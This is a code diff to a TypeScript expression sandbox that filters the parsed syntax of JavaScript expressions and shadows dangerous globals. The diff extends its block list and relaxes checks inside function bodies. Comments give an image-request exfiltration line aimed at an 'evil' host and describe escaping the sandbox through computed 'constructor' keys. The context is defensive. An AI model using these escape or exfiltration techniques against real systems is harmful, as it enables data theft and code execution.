@@ -1,21 +1,26 @@
 import * as acorn from "acorn";
+import { containsAwait, extractScopeReads } from "./analyze";
+import { isNode } from "./ast";
 
 /**
- * SafeEval - A secure JavaScript expression evaluator.
+ * SafeEval — a best-effort evaluator for small JavaScript expressions.
  *
- * Executes JS expressions with a provided context while preventing
- * access to the global scope, prototype chain exploits, and
- * non-expression code (loops, assignments, function declarations, etc.)
+ * Runs an expression against a provided context while shadowing ambient
+ * globals, blocking statements / side-effects, and rejecting *static* access to
+ * `constructor` / `__proto__` / `prototype`. Everything runs in the SAME realm,
+ * so Proxy-based reactive state passed in the context works directly.
  *
- * Supports Proxy objects in context - everything runs in the same realm.
+ * IMPORTANT — this is a guardrail, NOT a containment boundary. Static AST
+ * filtering cannot stop a determined adversary: a dynamically-computed property
+ * key (e.g. `obj["con" + "structor"]`) reaches the `Function` constructor and
+ * escapes every check here, the global shadowing included. Treat the expression
+ * author as semi-trusted. To run genuinely untrusted / adversarial expressions,
+ * isolate out-of-realm (Worker / iframe) or use SES. See
+ * `../docs/EXPRESSIONS.md` → "Security — what this does and doesn't stop".
  *
  * @example
  *   const evaluator = new SafeEval();
- *   const result = evaluator.eval(
- *     'orders.filter(o => o.active).reduce((sum, o) => sum + o.total, 0)',
- *     { orders: [{ active: true, total: 50 }, { active: false, total: 30 }] }
- *   );
- *   // result: 50
+ *   evaluator.eval("orders.filter(o => o.active).length", { orders: [] });
  */
 
 // --- Globals to shadow ---
@@ -45,11 +50,17 @@ const GLOBALS_TO_SHADOW = [
   "SharedWorker",
   "ServiceWorker",
   "importScripts",
+  // Element constructors that fire a network request via `.src` — an
+  // exfiltration channel even with fetch/XHR shadowed (e.g.
+  // `new Image().src = "https://evil/?" + secret`).
+  "Image",
+  "Audio",
 
   // Code execution
   // NOTE: "eval" and "arguments" cannot be parameter names in strict mode.
   // They are blocked at the AST level instead (see FORBIDDEN_IDENTIFIERS).
   "Function",
+  "WebAssembly", // WebAssembly.instantiate(bytes) runs arbitrary code
   "setTimeout",
   "setInterval",
   "setImmediate",
@@ -57,7 +68,7 @@ const GLOBALS_TO_SHADOW = [
   "requestIdleCallback",
   "queueMicrotask",
 
-  // Process / Node
+  // Process / non-browser runtimes
   "process",
   "require",
   "module",
@@ -65,6 +76,8 @@ const GLOBALS_TO_SHADOW = [
   "__dirname",
   "__filename",
   "Buffer",
+  "Deno", // runtime god-objects (fs / net / env) if evaluated outside a browser
+  "Bun",
 
   // DOM
   "alert",
@@ -90,80 +103,82 @@ const FORBIDDEN_IDENTIFIERS = new Set(["eval", "arguments"]);
 // declarations, or other non-expression constructs.
 const FORBIDDEN_NODE_TYPES = new Set([
   // Declarations
-  "VariableDeclaration",
-  "FunctionDeclaration",
-  "ClassDeclaration",
-  "ImportDeclaration",
-  "ExportNamedDeclaration",
-  "ExportDefaultDeclaration",
-  "ExportAllDeclaration",
+  "VariableDeclaration", // example: const x = 1
+  "FunctionDeclaration", // example: function f() {}
+  "ClassDeclaration", // example: class C {}
+  "ImportDeclaration", // example: import x from "m"
+  "ExportNamedDeclaration", // example: export { x }
+  "ExportDefaultDeclaration", // example: export default x
+  "ExportAllDeclaration", // example: export * from "m"
 
   // Statements
-  "BlockStatement",
-  "ExpressionStatement", // we handle the top-level one specially
-  "IfStatement",
-  "SwitchStatement",
-  "ForStatement",
-  "ForInStatement",
-  "ForOfStatement",
-  "WhileStatement",
-  "DoWhileStatement",
-  "TryStatement",
-  "ThrowStatement",
-  "ReturnStatement",
-  "BreakStatement",
-  "ContinueStatement",
-  "LabeledStatement",
-  "WithStatement",
-  "DebuggerStatement",
-  "EmptyStatement",
+  "BlockStatement", // example: { doThing(); }
+  "ExpressionStatement", // example: foo(); — top-level one handled specially
+  "IfStatement", // example: if (a) b
+  "SwitchStatement", // example: switch (x) { case 1: }
+  "ForStatement", // example: for (;;) {}
+  "ForInStatement", // example: for (k in o) {}
+  "ForOfStatement", // example: for (v of xs) {}
+  "WhileStatement", // example: while (a) {}
+  "DoWhileStatement", // example: do {} while (a)
+  "TryStatement", // example: try {} catch {}
+  "ThrowStatement", // example: throw e
+  "ReturnStatement", // example: return x
+  "BreakStatement", // example: break
+  "ContinueStatement", // example: continue
+  "LabeledStatement", // example: loop: for (;;) {}
+  "WithStatement", // example: with (o) {}
+  "DebuggerStatement", // example: debugger
+  "EmptyStatement", // example: ;
 
   // Other
-  "SequenceExpression", // prevents (sideEffect1, sideEffect2, returnValue)
-  "AssignmentExpression", // a = b, a += b, etc.
-  "UpdateExpression", // a++, --b
-  "YieldExpression",
-  "ImportExpression", // dynamic import()
-  "MetaProperty", // import.meta, new.target
+  "SequenceExpression", // example: (a, b, c) — comma operator
+  "AssignmentExpression", // example: a = b, a += b
+  "UpdateExpression", // example: a++, --b
+  "YieldExpression", // example: yield x
+  "ImportExpression", // example: import("m") — dynamic import
+  "MetaProperty", // example: import.meta, new.target
 ]);
 
-// --- Safe constructors allowed with `new` ---
-const SAFE_NEW_CONSTRUCTORS = new Set([
-  "Date",
-  "Array",
-  "Object",
-  "Map",
-  "Set",
-  "WeakMap",
-  "WeakSet",
-  "RegExp",
-  "Error",
-  "TypeError",
-  "RangeError",
-  "SyntaxError",
-  "ReferenceError",
-  "URIError",
-  "EvalError",
-  "Number",
-  "String",
-  "Boolean",
-  "Int8Array",
-  "Uint8Array",
-  "Uint8ClampedArray",
-  "Int16Array",
-  "Uint16Array",
-  "Int32Array",
-  "Uint32Array",
-  "Float32Array",
-  "Float64Array",
-  "BigInt64Array",
-  "BigUint64Array",
-  "ArrayBuffer",
-  "DataView",
-  "URL",
-  "URLSearchParams",
-  "TextEncoder",
-  "TextDecoder",
+// --- Node types allowed only inside function bodies ---
+// A block-body arrow (or function expression) is itself a valid expression, so
+// the statement constructs that can legally appear inside one are permitted
+// *when nested in a function body* — never at the top level, where the
+// element's `expr` must stay a single expression:
+//   items.reduce((acc, item) => { const x = item.v; return acc + x; }, 0)
+//
+// This list is deliberately generous. The prompt steers the model toward simple
+// expressions to save tokens, but the model is non-deterministic and will
+// occasionally reach for `if` / `switch` / a loop anyway. Tolerating the
+// safe-but-verbose forms turns a stylistic deviation into "works, just longer"
+// rather than a hard render failure. It does NOT relax the security boundary:
+// code execution, ambient globals, and prototype escapes stay blocked
+// everywhere (see GLOBALS_TO_SHADOW / FORBIDDEN_PROPERTIES). The one thing AST
+// validation can't bound is an infinite loop (`while (true) {}`) — expressions
+// run in the viewer's own browser, so that's a runtime/timeout concern.
+const ARROW_BODY_ALLOWED = new Set([
+  // Local bindings + the block itself
+  "BlockStatement", // example: => { ... }
+  "ReturnStatement", // example: => { return x }
+  "VariableDeclaration", // example: => { const x = 1; ... }
+  "ExpressionStatement", // example: => { doThing(); ... }
+  "AssignmentExpression", // example: => { acc.total += n; ... }
+  "UpdateExpression", // example: => { for (let i = 0; i < n; i++) ... }
+  // Conditionals
+  "IfStatement", // example: => { if (a) return b; ... }
+  "SwitchStatement", // example: => { switch (x) { case 1: return "a"; } }
+  // Loops
+  "ForStatement", // example: => { for (let i = 0; i < n; i++) { ... } }
+  "ForOfStatement", // example: => { for (const x of xs) { ... } }
+  "ForInStatement", // example: => { for (const k in obj) { ... } }
+  "WhileStatement", // example: => { while (cond) { ... } }
+  "DoWhileStatement", // example: => { do { ... } while (cond) }
+  // Flow control inside the above
+  "BreakStatement", // example: => { switch (x) { case 1: break; } }
+  "ContinueStatement", // example: => { for (const x of xs) { if (!x) continue; } }
+  // Defensive error handling
+  "TryStatement", // example: => { try { return f() } catch { return null } }
+  "ThrowStatement", // example: => { if (bad) throw new Error("x"); ... }
 ]);
 
 // --- Forbidden property names accessed on any object ---
@@ -177,322 +192,134 @@ const FORBIDDEN_PROPERTIES = new Set([
   "__lookupSetter__",
 ]);
 
-// --- AST Validation ---
-
-interface ASTNode {
-  type: string;
-  start?: number;
-  end?: number;
-  body?: ASTNode[];
-  expression?: ASTNode;
-  property?: ASTNode & { name?: string; value?: string | number | boolean };
-  computed?: boolean;
-  name?: string;
-  op?: string;
-  args?: ASTNode[];
-  [key: string]: unknown;
-}
+// --- AST Validation (the security boundary) ---
+//
+// `acorn.AnyNode` is the discriminated union `parse()` produces (narrowing on
+// `.type`), `acorn.Program` is the parse result. The `isNode` guard (./ast) and
+// the static analyzers — await / scope-read detection (./analyze) — are NOT
+// security; this is the part that decides what may execute.
+//
+// KNOWN LIMITATION: the `constructor`/`__proto__`/`prototype` block below only
+// catches *static* keys (dot access, or a string-literal computed key). A
+// dynamically-computed key — `obj["con"+"structor"]`, `obj[`constructor`]`,
+// `obj[["constructor"][0]]` — is undecidable here and reaches the real
+// `Function` constructor at runtime, escaping the whole sandbox. We can't fix
+// this statically without banning all computed access (`arr[i]`), which the
+// language needs. See the class docstring + EXPRESSIONS.md for the threat model.
 
 /**
  * Recursively walks the AST and throws if any forbidden node or
  * property access is found.
  */
 function validateNode(
-  node: ASTNode | null | undefined,
+  node: acorn.AnyNode | null | undefined,
   isRoot = false,
   isPropertyName = false,
-  insideArrowBody = false,
+  insideFunctionBody = false,
 ): void {
   if (!node || typeof node !== "object") return;
 
-  if (node.type) {
-    // Allow top-level ExpressionStatement (the wrapper acorn creates)
-    // and Program, but nothing else from the forbidden set.
-    if (node.type === "Program") {
-      if (!node.body || node.body.length !== 1) {
-        throw new SafeEvalError(
-          "Expression must be a single expression, got " +
-            (node.body?.length ?? 0) +
-            " statements",
-        );
-      }
-      validateNode(node.body[0], true);
-      return;
-    }
-
-    if (node.type === "ExpressionStatement" && isRoot) {
-      validateNode(node.expression);
-      return;
-    }
-
-    // Inside arrow function bodies, allow block-related constructs
-    // (BlockStatement, ReturnStatement, VariableDeclaration) since
-    // arrow functions with block bodies are valid expressions:
-    //   items.reduce((acc, item) => { const x = item.v; return acc + x; }, 0)
-    const ARROW_BODY_ALLOWED = new Set([
-      "BlockStatement",
-      "ReturnStatement",
-      "VariableDeclaration",
-      "ExpressionStatement",
-      "AssignmentExpression",
-      "IfStatement",
-    ]);
-
-    if (FORBIDDEN_NODE_TYPES.has(node.type)) {
-      if (!(insideArrowBody && ARROW_BODY_ALLOWED.has(node.type))) {
-        throw new SafeEvalError(
-          `Forbidden syntax: "${node.type}" is not allowed in expressions`,
-        );
-      }
-    }
-
-    // Block tagged template literals - they can call arbitrary functions
-    if (node.type === "TaggedTemplateExpression") {
+  // Allow top-level ExpressionStatement (the wrapper acorn creates)
+  // and Program, but nothing else from the forbidden set.
+  if (node.type === "Program") {
+    // Skip a leading "use strict" directive (validate() prepends one to force
+    // strict-mode parsing, matching strict execution). Exactly one real
+    // statement must remain: the wrapped expression.
+    const statements = node.body.filter(
+      (s) => !(s.type === "ExpressionStatement" && s.directive),
+    );
+    if (statements.length !== 1) {
       throw new SafeEvalError(
-        "Tagged template literals are not allowed in expressions",
+        `Expression must be a single expression, got ${statements.length} statements`,
       );
     }
+    validateNode(statements[0], true);
+    return;
+  }
 
-    // Check for property access to forbidden property names
-    if (node.type === "MemberExpression" && !node.computed) {
-      if (
-        node.property &&
-        (node.property as ASTNode).type === "Identifier" &&
-        FORBIDDEN_PROPERTIES.has(
-          (node.property as ASTNode & { name: string }).name,
-        )
-      ) {
-        throw new SafeEvalError(
-          `Access to "${(node.property as ASTNode & { name: string }).name}" is not allowed`,
-        );
-      }
-    }
+  if (node.type === "ExpressionStatement" && isRoot) {
+    validateNode(node.expression);
+    return;
+  }
 
-    // Check computed property access with string literals like obj["constructor"]
-    if (node.type === "MemberExpression" && node.computed) {
-      if (
-        node.property &&
-        (node.property as ASTNode).type === "Literal" &&
-        typeof (node.property as ASTNode & { value: unknown }).value ===
-          "string" &&
-        FORBIDDEN_PROPERTIES.has(
-          (node.property as ASTNode & { value: string }).value,
-        )
-      ) {
-        throw new SafeEvalError(
-          `Access to "${(node.property as ASTNode & { value: string }).value}" is not allowed`,
-        );
-      }
-    }
-
-    // Prevent `new` - only allow safe built-in constructors
-    if (node.type === "NewExpression") {
-      const callee = node.callee as ASTNode | undefined;
-      const isSafe =
-        callee?.type === "Identifier" &&
-        SAFE_NEW_CONSTRUCTORS.has(callee.name!);
-      if (!isSafe) {
-        throw new SafeEvalError(
-          `"new" expressions are only allowed for safe built-in constructors (${[...SAFE_NEW_CONSTRUCTORS].join(", ")})`,
-        );
-      }
-    }
-
-    // Block forbidden identifiers (eval, arguments) when used as
-    // variable references - but allow them as property names (obj.eval is fine)
-    if (
-      node.type === "Identifier" &&
-      !isPropertyName &&
-      FORBIDDEN_IDENTIFIERS.has(node.name!)
-    ) {
-      throw new SafeEvalError(`Access to "${node.name}" is not allowed`);
+  if (FORBIDDEN_NODE_TYPES.has(node.type)) {
+    if (!(insideFunctionBody && ARROW_BODY_ALLOWED.has(node.type))) {
+      throw new SafeEvalError(
+        `Forbidden syntax: "${node.type}" is not allowed in expressions`,
+      );
     }
   }
 
-  // Recurse into all child nodes
+  // Block tagged template literals - they can call arbitrary functions
+  if (node.type === "TaggedTemplateExpression") {
+    throw new SafeEvalError(
+      "Tagged template literals are not allowed in expressions",
+    );
+  }
+
+  // Check for property access to forbidden property names
+  if (node.type === "MemberExpression" && !node.computed) {
+    const prop = node.property;
+    if (prop.type === "Identifier" && FORBIDDEN_PROPERTIES.has(prop.name)) {
+      throw new SafeEvalError(`Access to "${prop.name}" is not allowed`);
+    }
+  }
+
+  // Check computed property access with string literals like obj["constructor"]
+  if (node.type === "MemberExpression" && node.computed) {
+    const prop = node.property;
+    if (
+      prop.type === "Literal" &&
+      typeof prop.value === "string" &&
+      FORBIDDEN_PROPERTIES.has(prop.value)
+    ) {
+      throw new SafeEvalError(`Access to "${prop.value}" is not allowed`);
+    }
+  }
+
+  // Block forbidden identifiers (eval, arguments) when used as
+  // variable references - but allow them as property names (obj.eval is fine)
+  if (
+    node.type === "Identifier" &&
+    !isPropertyName &&
+    FORBIDDEN_IDENTIFIERS.has(node.name)
+  ) {
+    throw new SafeEvalError(`Access to "${node.name}" is not allowed`);
+  }
+
+  // Recurse into all child nodes. The union has no index signature, so index
+  // the runtime shape; `isNode` filters out non-node fields (start/end/etc).
+  const fields = node as unknown as Record<string, unknown>;
   for (const key of Object.keys(node)) {
     if (key === "type" || key === "start" || key === "end") continue;
-    const child = node[key];
+    const child = fields[key];
 
     // Determine if this child is a non-computed property name
     const childIsPropertyName =
       node.type === "MemberExpression" && !node.computed && key === "property";
 
-    // Track when we enter an arrow function body
-    const childInsideArrowBody =
-      insideArrowBody ||
-      (node.type === "ArrowFunctionExpression" && key === "body");
+    // Track when we enter a function body (arrow or function expression) — the
+    // statement constructs in ARROW_BODY_ALLOWED are legal inside either.
+    const childInsideFunctionBody =
+      insideFunctionBody ||
+      ((node.type === "ArrowFunctionExpression" ||
+        node.type === "FunctionExpression") &&
+        key === "body");
 
-    if (Array.isArray(child)) {
-      child.forEach((c: ASTNode) =>
-        validateNode(c, false, false, childInsideArrowBody),
-      );
-    } else if (child && typeof child === "object" && (child as ASTNode).type) {
-      validateNode(
-        child as ASTNode,
-        false,
-        childIsPropertyName,
-        childInsideArrowBody,
-      );
-    }
-  }
-}
-
-/**
- * Check whether the AST contains any AwaitExpression node.
- */
-function containsAwait(node: ASTNode | null | undefined): boolean {
-  if (!node || typeof node !== "object") return false;
-  if (node.type === "AwaitExpression") return true;
-  for (const key of Object.keys(node)) {
-    if (key === "type" || key === "start" || key === "end") continue;
-    const child = node[key];
     if (Array.isArray(child)) {
       for (const c of child) {
-        if (c && typeof c === "object" && containsAwait(c as ASTNode))
-          return true;
+        if (isNode(c)) validateNode(c, false, false, childInsideFunctionBody);
       }
-    } else if (child && typeof child === "object" && (child as ASTNode).type) {
-      if (containsAwait(child as ASTNode)) return true;
-    }
-  }
-  return false;
-}
-
-// --- Scope-read extraction ---
-//
-// Walks the AST collecting every `scopes.X.Y…` chain the expression reads,
-// stopping at the first non-static segment (computed-key, call, non-Identifier
-// property). The output drives the reactive subscription set for a chunk —
-// the LLM no longer specifies `deps` manually; it's auto-derived here.
-//
-// Chains that appear as the callee of a CallExpression are recorded WITHOUT
-// the final segment — `scopes.inv.rows.filter(...)` yields `scopes.inv.rows`,
-// not `scopes.inv.rows.filter`. The trailing identifier is a method call, not
-// a data dependency. Edge cases:
-//   - `scopes.x[scopes.y.z]`        → adds `scopes.x` AND `scopes.y.z`
-//   - `scopes.x[i].y`               → adds `scopes.x` (mid-chain dynamic; `.y`
-//                                     is unreachable without resolving `i`)
-//   - `scopes` alone                → nothing (bare identifier, no path)
-//   - `({a: scopes.x.y, b: scopes.x.z})` → adds both
-//   - `\`${scopes.x.y}\``           → adds `scopes.x.y` (template literal walked)
-
-/**
- * Walk down a MemberExpression chain collecting static identifier segments.
- * Returns null if the chain hits a computed-key access or a non-Identifier
- * property anywhere along the way.
- */
-function collectChain(node: ASTNode | null | undefined): string[] | null {
-  const parts: string[] = [];
-  let cur: ASTNode | null | undefined = node;
-  while (cur) {
-    if (cur.type === "MemberExpression") {
-      if (cur.computed) return null;
-      const prop = cur.property as ASTNode | undefined;
-      if (!prop || prop.type !== "Identifier") return null;
-      parts.unshift((prop as ASTNode & { name: string }).name);
-      cur = cur.object as ASTNode | undefined;
-    } else if (cur.type === "Identifier") {
-      parts.unshift((cur as ASTNode & { name: string }).name);
-      return parts;
-    } else {
-      return null;
-    }
-  }
-  return null;
-}
-
-/**
- * Walk the children of a MemberExpression looking for computed-key
- * sub-expressions. Each computed key may itself contain `scopes.X.Y` reads
- * we need to capture.
- */
-function walkComputedKeysWithin(
-  memberExpr: ASTNode,
-  out: Set<string>,
-): void {
-  let cur: ASTNode | undefined = memberExpr;
-  while (cur?.type === "MemberExpression") {
-    if (cur.computed && cur.property) {
-      walkScopeReads(cur.property as ASTNode, out);
-    }
-    cur = cur.object as ASTNode | undefined;
-  }
-}
-
-/**
- * Recursive AST walker. Public entry point is `extractScopeReads(ast)`.
- */
-function walkScopeReads(
-  node: ASTNode | null | undefined,
-  out: Set<string>,
-): void {
-  if (!node || typeof node !== "object") return;
-
-  // CallExpression: if callee is a MemberExpression like `scopes.X.Y.method`,
-  // record `scopes.X.Y` (drop the method name). The trailing segment is a
-  // method dispatch, not a data read.
-  if (node.type === "CallExpression") {
-    const callee = node.callee as ASTNode | undefined;
-    if (callee?.type === "MemberExpression" && !callee.computed) {
-      const chain = collectChain(callee.object as ASTNode);
-      if (chain && chain[0] === "scopes" && chain.length > 1) {
-        out.add(chain.join("."));
-        // The callee's object may itself contain computed sub-keys we missed.
-        walkComputedKeysWithin(callee.object as ASTNode, out);
-      } else {
-        walkScopeReads(callee.object as ASTNode, out);
-      }
-    } else if (callee) {
-      walkScopeReads(callee, out);
-    }
-    for (const arg of (node.arguments as ASTNode[] | undefined) ?? []) {
-      walkScopeReads(arg, out);
-    }
-    return;
-  }
-
-  // MemberExpression: try to collect a static chain rooted at `scopes`.
-  if (node.type === "MemberExpression") {
-    const chain = collectChain(node);
-    if (chain && chain[0] === "scopes" && chain.length > 1) {
-      out.add(chain.join("."));
-      walkComputedKeysWithin(node, out);
-      return;
-    }
-    // Chain didn't reach `scopes` (or hit a computed segment). Walk children
-    // so we catch nested `scopes.X.Y` reads inside computed keys / object refs.
-    walkScopeReads(node.object as ASTNode, out);
-    if (node.computed && node.property) {
-      walkScopeReads(node.property as ASTNode, out);
-    }
-    return;
-  }
-
-  // Generic recursion for everything else (ArrowFunction body, Object/Array
-  // literals, conditional/logical expressions, template literals, etc.).
-  for (const key of Object.keys(node)) {
-    if (key === "type" || key === "start" || key === "end") continue;
-    const child = node[key];
-    if (Array.isArray(child)) {
-      for (const c of child) {
-        walkScopeReads(c as ASTNode, out);
-      }
-    } else if (child && typeof child === "object" && (child as ASTNode).type) {
-      walkScopeReads(child as ASTNode, out);
+    } else if (isNode(child)) {
+      validateNode(child, false, childIsPropertyName, childInsideFunctionBody);
     }
   }
 }
 
-function extractScopeReads(ast: ASTNode): string[] {
-  const out = new Set<string>();
-  walkScopeReads(ast, out);
-  return [...out];
-}
-
-// AsyncFunction constructor for evaluating expressions that use `await`
-// eslint-disable-next-line @typescript-eslint/no-empty-function
-const AsyncFunction = Object.getPrototypeOf(async function () {})
+// The AsyncFunction constructor — compiles expressions that contain `await`.
+// Resolved once at module load via the prototype of an async function. (This
+// `.constructor` read is our own module code, never sandboxed input.)
+const AsyncFunction = Object.getPrototypeOf(async () => {})
   .constructor as typeof Function;
 
 // --- Error class ---
@@ -513,6 +340,11 @@ type CacheEntry = {
   // both fill the entry without paying the `new Function(...)` cost. The
   // first `compile()` (or `eval()`) call upgrades the entry with a real fn.
   fn?: (context: Record<string, unknown>) => unknown;
+  // Per-context-shape compiled functions, keyed by the context-key signature.
+  // `new Function(...)` depends only on the expression + the parameter names
+  // (context keys ∪ shadow-params), so the same expression evaluated repeatedly
+  // with the same context shape compiles once, not once per call.
+  compiledBySig?: Map<string, (...args: unknown[]) => unknown>;
 };
 
 export class SafeEval {
@@ -568,19 +400,21 @@ export class SafeEval {
       return { isAsync: cached.isAsync, scopeReads: cached.scopeReads };
     }
 
-    // Parse as a script containing `void (expr)`.
-    // This ensures the expression is parsed as an expression (not a statement),
-    // so `{...}` is treated as an object literal, not a block.
-    // The `void` prefix forces expression context, matching how compile()
-    // wraps it as `return (expr)`.
-    const wrapper = `void (${trimmed})`;
-    let ast: ASTNode;
+    // Parse as a script containing `"use strict"; void (expr)`.
+    // - `void (...)` forces expression context, so `{...}` is an object literal,
+    //   not a block — matching how compile() wraps it as `return (expr)`.
+    // - The leading `"use strict"` directive makes acorn parse in strict mode,
+    //   matching strict execution: constructs that are sloppy-legal but
+    //   strict-illegal (octal literals, `with`, duplicate params, …) are
+    //   rejected here at validate time, instead of throwing raw at compile.
+    const wrapper = `"use strict"; void (${trimmed})`;
+    let ast: acorn.Program;
     try {
       ast = acorn.parse(wrapper, {
         ecmaVersion: 2022,
         sourceType: "script",
         allowAwaitOutsideFunction: true,
-      }) as unknown as ASTNode;
+      });
     } catch (e: unknown) {
       throw new SafeEvalError(
         `Syntax error: ${e instanceof Error ? e.message : String(e)}. Expression: ${expression}`,
@@ -597,7 +431,7 @@ export class SafeEval {
     };
 
     // Insert analysis into cache without a compiled fn — `compile()` will
-    // upgrade lazily. Eviction policy mirrors compile()'s.
+    // upgrade lazily. Evict oldest first when full (insertion-order Map).
     if (this.#cache.size >= this.#maxCacheSize) {
       const firstKey = this.#cache.keys().next().value;
       if (firstKey !== undefined) this.#cache.delete(firstKey);
@@ -612,50 +446,65 @@ export class SafeEval {
    * If the expression uses `await`, the returned function will return a Promise.
    */
   compile(expression: string): (context: Record<string, unknown>) => unknown {
-    // validate() populates the cache with analysis (no fn yet) on first call,
-    // and is a no-op cache hit on subsequent calls. After this, cache entry
-    // exists either with or without a `fn`.
+    // validate() populates the cache with the analysis (no `fn` yet) on the
+    // first call, and is a cheap cache hit afterwards. So the entry is always
+    // present below — we only need to attach the compiled `fn` lazily.
     const { isAsync } = this.validate(expression);
     const entry = this.#cache.get(expression);
-    if (entry?.fn) return entry.fn;
+    if (!entry) {
+      // Unreachable: validate() just inserted this entry. Fail loud rather
+      // than silently recompile with empty analysis.
+      throw new SafeEvalError(
+        `Cache entry missing for expression: ${expression}`,
+      );
+    }
+    if (entry.fn) return entry.fn;
 
     const expr = expression.trim();
     const Ctor = isAsync ? AsyncFunction : Function;
 
     const evaluator = (context: Record<string, unknown>) => {
       const contextKeys = Object.keys(context);
-      const contextValues = Object.values(context);
 
-      // Ensure context keys don't collide with shadow params
-      const allParams = [...contextKeys, ...this.#shadowParams];
+      // The compiled function depends only on the expression and its parameter
+      // names (context keys ∪ shadow-params), never on the argument *values* —
+      // so memoize it by the context-key signature. The common case (the same
+      // expression re-evaluated as state changes, with a stable context shape)
+      // then pays `new Function(...)` once, not once per evaluation.
+      const sig = contextKeys.join(" ");
+      const compiledBySig = (entry.compiledBySig ??= new Map());
+      let compiled = compiledBySig.get(sig);
+      if (!compiled) {
+        // Context keys become named params; shadow-params follow, bound to
+        // `undefined`, so referencing a shadowed global yields undefined.
+        const allParams = [...contextKeys, ...this.#shadowParams];
+        try {
+          compiled = new Ctor(...allParams, `"use strict"; return (${expr})`) as (
+            ...args: unknown[]
+          ) => unknown;
+        } catch (e: unknown) {
+          // validate() parses in strict mode, so this is rare — but a construct
+          // that parses yet won't compile must surface as a SafeEvalError, not
+          // a raw SyntaxError escaping from `new Function`.
+          throw new SafeEvalError(
+            `Failed to compile expression: ${
+              e instanceof Error ? e.message : String(e)
+            }. Expression: ${expression}`,
+          );
+        }
+        compiledBySig.set(sig, compiled);
+      }
+
+      // Argument order matches `allParams`: context values (in `Object.keys`
+      // order — the same order `sig` was built from) then the shadow fills.
       const allArgs = [
-        ...contextValues,
+        ...Object.values(context),
         ...new Array(this.#shadowParams.length).fill(undefined),
       ];
-
-      // Build and execute (AsyncFunction for await, Function otherwise)
-      const fn = new Ctor(...allParams, `"use strict"; return (${expr})`);
-
-      return fn(...allArgs);
+      return compiled(...allArgs);
     };
 
-    // Upgrade the entry validate() inserted with the compiled evaluator.
-    // The entry must exist here — validate() just put it there above.
-    if (entry) {
-      entry.fn = evaluator;
-    } else {
-      // Defensive: should never happen, but mirror the original eviction.
-      if (this.#cache.size >= this.#maxCacheSize) {
-        const firstKey = this.#cache.keys().next().value;
-        if (firstKey !== undefined) this.#cache.delete(firstKey);
-      }
-      this.#cache.set(expression, {
-        fn: evaluator,
-        isAsync,
-        scopeReads: [],
-      });
-    }
-
+    entry.fn = evaluator;
     return evaluator;
   }
 
